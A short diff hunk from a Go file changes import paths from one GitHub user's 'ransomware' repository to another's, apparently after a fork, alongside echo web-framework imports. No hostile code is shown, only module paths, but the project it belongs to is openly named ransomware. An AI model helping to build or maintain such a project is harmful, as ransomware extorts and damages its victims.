@@ -10,8 +10,8 @@ import (
 	"github.com/labstack/echo/engine"
 	"github.com/labstack/echo/engine/standard"
 	"github.com/labstack/echo/middleware"
-	"github.com/mauri870/ransomware/repository"
-	"github.com/mauri870/ransomware/web"
+	"github.com/target111/ransomware/repository"
+	"github.com/target111/ransomware/web"
 )
 
 var (
